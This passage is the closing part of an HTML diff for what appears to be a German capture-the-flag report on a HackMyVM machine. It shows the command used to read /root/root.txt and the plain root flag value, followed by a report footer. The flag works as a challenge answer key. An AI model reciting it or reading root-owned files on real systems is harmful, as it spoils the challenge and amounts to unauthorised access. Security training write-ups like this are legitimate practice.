+                     <div class="flag-command">cat /root/root.txt</div>
+                     <!-- Root-Flagge -->
+                     <div class="flag-value"><span class="password">HMV{Y4NV!7Ch3N1N_Y0u_4r3_7h3_R007_8672}</span></div>
+                 </div>
+             </div>
+             <!-- Keine Analyse/Bewertung/Empfehlung im Flags-Abschnitt -->
+         </section>
+    
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <!-- Datum aus Nmap/Nikto Scans übernommen -->
+        <p>Berichtsdatum: 2024-05-06</p>
+    </footer>
+</body>
+</html>
